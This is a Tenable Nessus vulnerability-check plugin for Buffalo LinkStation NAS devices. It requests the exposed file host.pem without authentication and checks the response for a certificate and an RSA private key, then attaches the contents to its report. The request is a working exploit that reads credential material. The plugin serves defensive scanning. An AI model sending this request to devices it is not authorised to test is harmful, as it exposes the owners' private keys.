#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64915);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 20:59:28 $");

  script_bugtraq_id(56784);
  script_osvdb_id(88164);

  script_name(english:"Buffalo LinkStation Direct Request Remote File Disclosure");
  script_summary(english:"Tries to retrieve modules/webaxs/module/files/host.pem");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by a
remote file disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The web server included with the remote Buffalo LinkStation device does
not properly configure access rights, which allows an unauthenticated
remote attacker to gain access to sensitive files such as the device's
private RSA key.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("buffalo_linkstation_detect.nasl");
  script_require_keys("www/buffalo_linkstation");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "Buffalo LinkStation";

port = get_http_port(default:80, embedded:TRUE);

install = get_install_from_kb(appname:"buffalo_linkstation", port:port, exit_on_fail:TRUE);
dir = install["dir"];

report = '';
file = "/modules/webaxs/module/files/host.pem";
url = dir + file;
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (
  "--BEGIN CERTIFICATE---" >< res[2] &&
  "--END CERTIFICATE--" >< res[2] &&
  "--BEGIN RSA PRIVATE KEY--" >< res[2] &&
  "--END RSA PRIVATE KEY--" >< res[2]
)
{
  if (report_verbosity > 0)
  {
   line_limit = 10;
   header =
     'Nessus was able to exploit the issue to retrieve the contents of' +
     '\n\'' + file + '\' on the remote host using' +
     '\nthe following URL' +
   trailer = '';
   report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
   if ( ! defined_func("security_report_with_attachments") )
   	security_warning(port:port, extra:report);
   else
	{
	 attachments = make_list();
	 attachments[0] = make_array();
	 attachments[0]["type"] = "text/plain";
	 attachments[0]["name"] = "host.pm";
	 attachments[0]["value"] = res[2];
	 security_report_with_attachments(level:2, port:port, extra:report, attachments:attachments);
	}
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:'/'));
